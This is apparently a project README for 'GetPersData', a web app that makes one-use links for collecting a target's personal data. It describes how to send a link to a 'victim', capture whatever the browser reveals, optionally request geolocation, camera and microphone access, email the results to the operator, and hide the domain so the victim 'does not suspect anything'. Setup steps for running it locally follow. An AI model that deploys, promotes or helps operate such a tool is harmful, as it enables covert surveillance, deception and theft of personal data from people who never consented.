# GetPersData Web App

Do you want to get personal data of some person and don’t know what to do? Fill out the form, send the victim a link and find out everything about it that the browser knows.

## Link

https://get-pers-data.web.app/

## How to use it?

- An email will be sent to the entered email with the data that was received.

- After clicking on the generated link, the victim will be redirected to the link that you enter in the Redirect URL field.

- The "Hide URL address" option allows you to hide our domain so that the victim does not suspect anything.

- Use the "Try to get geolocation", "Take a photo" and "Record an audio" options at your own risk, as this will request additional permissions from the victim, which may provoke suspicion.

- Copy the link and send it to anyone. Keep in mind that the link has a limited number of uses (usually only one) and then becomes unavailable.

## How to launch it on your machine?

1. Clone the repository
```bash
git clone https://github.com/dominon12/GetPersData
```
2. Go to the folder 
```bash
cd GetPersData
```
3. Install dependencies
```bash
npm install
```
4. In '/src/Services/' folder create a file called 'Credentials.ts' with the following code
```typescript
export const LINK_SHORTENER_TOKEN = "YOUR TOKEN FROM bit.ly"; // Needs to shortify url
export const BACKEND_TOKEN = "YOUR BACKEND TOKEN"; // Needs to send an email
```
5. Run the app
```bash
npm run start
```
6. Open 'http://localhost:3000/' and enjoy